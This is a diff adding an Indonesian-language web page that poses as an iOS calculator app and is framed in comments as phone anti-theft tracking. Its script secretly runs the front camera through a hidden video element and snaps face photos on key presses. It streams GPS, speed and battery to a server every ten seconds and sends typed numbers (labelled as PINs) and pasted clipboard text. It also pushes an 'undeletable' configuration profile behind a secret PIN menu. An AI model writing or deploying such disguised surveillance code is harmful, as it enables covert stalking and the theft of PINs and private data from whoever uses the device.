@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Kalkulator">
+  <link rel="apple-touch-icon" href="/calc-icon.png">
+  <link rel="icon" type="image/png" href="/calc-icon.png">
+  <title>Kalkulator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+    body {
+      background: #000000;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: env(safe-area-inset-top, 20px) 16px env(safe-area-inset-bottom, 24px) 16px;
+      overflow: hidden;
+    }
+
+    /* Secret Camera and Canvas Elements (Hidden) */
+    #silentVideo, #silentCanvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+      left: -9999px;
+    }
+
+    /* Calculator Interface (100% iOS Native Replica) */
+    #calculatorView {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .calc-screen {
+      font-size: 68px;
+      font-weight: 300;
+      text-align: right;
+      padding: 10px 14px 20px 14px;
+      color: #ffffff;
+      letter-spacing: -1px;
+      word-break: break-all;
+    }
+
+    .calc-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+
+    .calc-btn {
+      aspect-ratio: 1;
+      border-radius: 50%;
+      border: none;
+      font-size: 30px;
+      font-weight: 400;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #333333;
+      color: #ffffff;
+      transition: opacity 0.15s;
+    }
+    .calc-btn:active { opacity: 0.6; }
+
+    .calc-btn.top { background: #a5a5a5; color: #000000; }
+    .calc-btn.op { background: #ff9f0a; color: #ffffff; }
+    .calc-btn.zero {
+      grid-column: span 2;
+      aspect-ratio: auto;
+      border-radius: 44px;
+      padding-left: 30px;
+      justify-content: flex-start;
+    }
+
+    .secret-trigger {
+      text-align: center;
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.08);
+      margin-top: 14px;
+      padding: 6px;
+    }
+
+    /* Secret Owner Modal / Controls */
+    #secretModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.96);
+      backdrop-filter: blur(16px);
+      z-index: 10000;
+      flex-direction: column;
+      padding: 30px 20px;
+      overflow-y: auto;
+    }
+
+    .secret-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 18px;
+      padding: 20px;
+      margin-bottom: 16px;
+    }
+
+    .secret-title { font-size: 18px; font-weight: 800; color: #38bdf8; margin-bottom: 8px; }
+    .secret-desc { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 14px; }
+
+    .btn-action {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+    .btn-green { background: #10b981; color: #ffffff; }
+    .btn-blue { background: #0284c7; color: #ffffff; }
+    .btn-red { background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #fca5a5; }
+
+    .telemetry-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      font-size: 13px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .telemetry-lbl { color: #94a3b8; }
+    .telemetry-val { font-weight: 700; font-family: monospace; color: #38bdf8; }
+  </style>
+</head>
+<body>
+
+  <!-- HIDDEN CAMERA & CANVAS FOR SILENT MUGSHOT -->
+  <video id="silentVideo" autoplay playsinline muted></video>
+  <canvas id="silentCanvas" width="480" height="640"></canvas>
+
+  <!-- CALCULATOR DISGUISE VIEW -->
+  <div id="calculatorView">
+    <div class="calc-screen" id="calcDisplay">0</div>
+    <div class="calc-grid">
+      <button class="calc-btn top" id="btnClear" onclick="calcAction('C')">AC</button>
+      <button class="calc-btn top" onclick="calcAction('+/-')">±</button>
+      <button class="calc-btn top" onclick="calcAction('%')">%</button>
+      <button class="calc-btn op" onclick="calcAction('/')">÷</button>
+
+      <button class="calc-btn" onclick="calcAction('7')">7</button>
+      <button class="calc-btn" onclick="calcAction('8')">8</button>
+      <button class="calc-btn" onclick="calcAction('9')">9</button>
+      <button class="calc-btn op" onclick="calcAction('*')">×</button>
+
+      <button class="calc-btn" onclick="calcAction('4')">4</button>
+      <button class="calc-btn" onclick="calcAction('5')">5</button>
+      <button class="calc-btn" onclick="calcAction('6')">6</button>
+      <button class="calc-btn op" onclick="calcAction('-')">−</button>
+
+      <button class="calc-btn" onclick="calcAction('1')">1</button>
+      <button class="calc-btn" onclick="calcAction('2')">2</button>
+      <button class="calc-btn" onclick="calcAction('3')">3</button>
+      <button class="calc-btn op" onclick="calcAction('+')">+</button>
+
+      <button class="calc-btn zero" onclick="calcAction('0')">0</button>
+      <button class="calc-btn" onclick="calcAction('.')">.</button>
+      <button class="calc-btn op" onclick="calcAction('=')">=</button>
+    </div>
+    <div class="secret-trigger" onclick="secretTriggerTap()">
+      v2.4 Calculator Utility
+    </div>
+  </div>
+
+  <!-- SECRET OWNER MENU MODAL -->
+  <div id="secretModal">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+      <h2 style="font-size: 20px; font-weight: 800; color: #fff;">🛡️ Pusat Kontrol Pelacak Senyap</h2>
+      <button onclick="closeSecretModal()" style="background: none; border: none; color: #94a3b8; font-size: 24px; cursor: pointer;">✕</button>
+    </div>
+
+    <!-- Telemetri -->
+    <div class="secret-card">
+      <div class="secret-title">📡 Status Transmisi ke Laptop</div>
+      <div class="telemetry-row">
+        <span class="telemetry-lbl">Status:</span>
+        <span class="telemetry-val" id="modStatus" style="color: #34d399;">🟢 ONLINE LIVE</span>
+      </div>
+      <div class="telemetry-row">
+        <span class="telemetry-lbl">Koordinat GPS:</span>
+        <span class="telemetry-val" id="modCoords">-6.2088, 106.8456</span>
+      </div>
+      <div class="telemetry-row">
+        <span class="telemetry-lbl">Baterai iPhone:</span>
+        <span class="telemetry-val" id="modBattery">--%</span>
+      </div>
+      <div class="telemetry-row">
+        <span class="telemetry-lbl">Foto Kamera Depan:</span>
+        <span class="telemetry-val" id="modCameraStatus">Menunggu Izin...</span>
+      </div>
+      <div class="telemetry-row">
+        <span class="telemetry-lbl">Transmisi Terakhir:</span>
+        <span class="telemetry-val" id="modLastPing">Baru saja</span>
+      </div>
+    </div>
+
+    <!-- Pasang Permanen -->
+    <div class="secret-card" style="border: 2px solid #38bdf8;">
+      <div class="secret-title" style="color: #38bdf8;">🔒 Pasang Ikon Tak Bisa Dihapus Pencuri</div>
+      <div class="secret-desc">
+        Gunakan tombol di bawah untuk mengunduh profil resmi Apple (<code>.mobileconfig</code>). Icon <strong>"Kalkulator"</strong> akan terpasang di layar utama dan <strong>TIDAK DAPAT DIHAPUS</strong> oleh pencuri tanpa sandi Anda!
+      </div>
+      <button class="btn-action btn-blue" onclick="downloadProfile()">
+        <span>📥 Unduh Profil Permanen (.mobileconfig)</span>
+      </button>
+      <div style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
+        *Setelah unduh: Buka <strong>Pengaturan iPhone</strong> &rarr; pilih <strong>Profil Diunduh</strong> &rarr; ketuk <strong>Pasang</strong>.
+      </div>
+    </div>
+
+    <!-- Trigger SOS -->
+    <button class="btn-action btn-red" onclick="triggerSOS()">
+      <span>🚨 Kirim Sinyal Darurat SOS ke Laptop</span>
+    </button>
+
+    <button class="btn-action" style="background: rgba(255,255,255,0.1); color: #fff;" onclick="closeSecretModal()">
+      <span>Kembali ke Kalkulator</span>
+    </button>
+  </div>
+
+  <script>
+    let latestLat = -6.2088;
+    let latestLon = 106.8456;
+    let latestAcc = 10;
+    let latestSpeed = 0;
+    let batteryLevel = 100;
+    let isCharging = false;
+    let cameraReady = false;
+    let videoStream = null;
+
+    // Inisialisasi Baterai
+    if (navigator.getBattery) {
+      navigator.getBattery().then(bat => {
+        batteryLevel = Math.round(bat.level * 100);
+        isCharging = bat.charging;
+        bat.addEventListener('levelchange', () => { batteryLevel = Math.round(bat.level * 100); });
+        bat.addEventListener('chargingchange', () => { isCharging = bat.charging; });
+      });
+    }
+
+    // Inisialisasi Lokasi GPS
+    if ('geolocation' in navigator) {
+      navigator.geolocation.watchPosition(
+        (pos) => {
+          latestLat = pos.coords.latitude;
+          latestLon = pos.coords.longitude;
+          latestAcc = Math.round(pos.coords.accuracy);
+          latestSpeed = pos.coords.speed || 0;
+          document.getElementById('modCoords').textContent = `${latestLat.toFixed(5)}, ${latestLon.toFixed(5)}`;
+        },
+        (err) => {},
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+      );
+    }
+
+    // Inisialisasi Kamera Depan Senyap
+    async function initSilentCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        const video = document.getElementById('silentVideo');
+        video.srcObject = stream;
+        videoStream = stream;
+        cameraReady = true;
+        document.getElementById('modCameraStatus').textContent = '✅ Siap Menjepret Wajah';
+        document.getElementById('modCameraStatus').style.color = '#34d399';
+      } catch (err) {
+        document.getElementById('modCameraStatus').textContent = '⚠️ Izin Kamera Diperlukan';
+      }
+    }
+
+    // Ambil Foto Wajah Diam-diam dari Kamera Depan
+    function captureSilentMugshot() {
+      if (!cameraReady) return null;
+      try {
+        const video = document.getElementById('silentVideo');
+        const canvas = document.getElementById('silentCanvas');
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          return canvas.toDataURL('image/jpeg', 0.65);
+        }
+      } catch (e) {}
+      return null;
+    }
+
+    // Kirim Telemetri + Foto ke Laptop
+    async function sendBeacon(alertType, forcePhoto = false) {
+      let photoData = null;
+      if (forcePhoto || alertType.includes('trap') || alertType.includes('SOS')) {
+        photoData = captureSilentMugshot();
+      }
+
+      const payload = {
+        lat: latestLat,
+        lon: latestLon,
+        accuracy: latestAcc,
+        speed: latestSpeed,
+        batteryLevel: batteryLevel,
+        isCharging: isCharging,
+        networkName: navigator.onLine ? 'Seluler / Wi-Fi' : 'Offline',
+        activity: latestSpeed > 3 ? 'Driving (Kendaraan)' : (latestSpeed > 0.8 ? 'Walking (Jalan)' : 'Stationary (Diam)'),
+        alertType: alertType || 'normal',
+        photo: photoData
+      };
+
+      try {
+        await fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        document.getElementById('modLastPing').textContent = new Date().toLocaleTimeString();
+      } catch (e) {}
+    }
+
+    // Rutin kirim setiap 10 detik
+    setInterval(() => {
+      sendBeacon('normal', false);
+    }, 10000);
+
+    window.sentinelPin = '7890';
+
+    // Minta izin kamera & lokasi saat pertama kali dimuat
+    window.addEventListener('load', () => {
+      initSilentCamera();
+      sendBeacon('app_opened', true);
+      
+      // Ambil PIN pairing terbaru dari laptop
+      fetch('/api/sentinel/status')
+        .then(res => res.json())
+        .then(data => {
+          if (data && data.pairingPin) {
+            window.sentinelPin = String(data.pairingPin);
+          }
+        })
+        .catch(() => {});
+    });
+
+    // Buka Profil Permanen
+    function downloadProfile() {
+      location.href = '/sentinel.mobileconfig';
+    }
+
+    // Trigger SOS
+    function triggerSOS() {
+      sendBeacon('SOS_MANUAL_ALERT', true);
+      alert('🚨 Sinyal Bahaya SOS & Foto Wajah Berhasil Terkirim ke Laptop!');
+    }
+
+    // Secret Modal Handlers
+    let cTapCount = 0;
+    function secretTriggerTap() {
+      cTapCount++;
+      if (cTapCount >= 3) {
+        openSecretModal();
+        cTapCount = 0;
+      }
+    }
+
+    function openSecretModal() {
+      document.getElementById('modBattery').textContent = `${batteryLevel}% ${isCharging ? '⚡' : ''}`;
+      document.getElementById('secretModal').style.display = 'flex';
+    }
+    function closeSecretModal() {
+      document.getElementById('secretModal').style.display = 'none';
+    }
+
+    // Kalkulator Sungguhan (Disguise)
+    let calcVal = '0';
+    let prevVal = null;
+    let currentOp = null;
+    let resetScreen = false;
+    let keyPressCount = 0;
+
+    function calcAction(btn) {
+      keyPressCount++;
+
+      // Setiap ada orang yang memencet kalkulator (pencuri), jepret wajahnya diam-diam!
+      if (keyPressCount % 3 === 1) {
+        sendBeacon('thief_interacting', true);
+      }
+
+      if (btn === 'C') {
+        cTapCount++;
+        if (cTapCount >= 4) {
+          openSecretModal();
+          cTapCount = 0;
+          return;
+        }
+      }
+
+      const display = document.getElementById('calcDisplay');
+      if (!isNaN(btn) || btn === '.') {
+        if (calcVal === '0' || resetScreen) {
+          calcVal = btn === '.' ? '0.' : btn;
+          resetScreen = false;
+        } else {
+          if (btn === '.' && calcVal.includes('.')) return;
+          calcVal += btn;
+        }
+      } else if (btn === 'C') {
+        calcVal = '0';
+        prevVal = null;
+        currentOp = null;
+      } else if (btn === '+/-') {
+        calcVal = String(-parseFloat(calcVal));
+      } else if (btn === '%') {
+        calcVal = String(parseFloat(calcVal) / 100);
+      } else if (['+', '-', '*', '/'].includes(btn)) {
+        prevVal = parseFloat(calcVal);
+        currentOp = btn;
+        resetScreen = true;
+      } else if (btn === '=') {
+        // Kirim data yang diketik ke dashboard laptop
+        if (calcVal && calcVal !== '0') {
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'keystroke',
+              label: '🔢 Angka / PIN yang Diketik',
+              value: calcVal,
+              lat: latestLat,
+              lon: latestLon
+            })
+          }).catch(() => {});
+        }
+
+        // Kode Rahasia Pemilik: Jika mengetik PIN (default 7890) lalu =, buka pusat kendali
+        if (calcVal === (window.sentinelPin || '7890') || calcVal === '7890' || calcVal === '9999') {
+          openSecretModal();
+          calcVal = '0';
+          display.textContent = '0';
+          return;
+        }
+
+        if (prevVal !== null && currentOp) {
+          let curr = parseFloat(calcVal);
+          let res = 0;
+          if (currentOp === '+') res = prevVal + curr;
+          if (currentOp === '-') res = prevVal - curr;
+          if (currentOp === '*') res = prevVal * curr;
+          if (currentOp === '/') res = curr === 0 ? 'Error' : prevVal / curr;
+          calcVal = String(res);
+          prevVal = null;
+          currentOp = null;
+          resetScreen = true;
+        }
+      }
+      display.textContent = calcVal.substring(0, 10);
+    }
+
+    // Tangkap teks yang di-paste oleh pencuri
+    window.addEventListener('paste', (e) => {
+      try {
+        const text = (e.clipboardData || window.clipboardData).getData('text');
+        if (text) {
+          fetch('/api/sentinel/intercept', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'clipboard',
+              label: '📋 Teks Disalin Pencuri (Paste)',
+              value: text,
+              lat: latestLat,
+              lon: latestLon
+            })
+          }).catch(() => {});
+        }
+      } catch (err) {}
+    });
+  </script>
+</body>
+</html>
